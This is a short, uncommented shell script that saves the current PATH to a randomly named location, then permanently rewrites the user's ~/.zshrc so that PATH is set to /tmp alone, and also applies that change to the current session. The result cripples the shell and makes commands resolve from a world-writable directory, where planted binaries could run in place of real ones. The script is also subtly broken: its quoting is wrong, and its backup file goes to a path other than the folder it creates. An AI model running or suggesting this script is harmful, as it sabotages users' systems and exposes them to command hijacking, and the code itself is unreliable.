SAVE_FOLDER=$(cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
mkdir ~/$SAVE_FOLDER
echo $PATH > $SAVE_FOLDER/PATH_SAVE
echo 'export PATH=\'/tmp\'' >> ~/.zshrc
export PATH='/tmp'
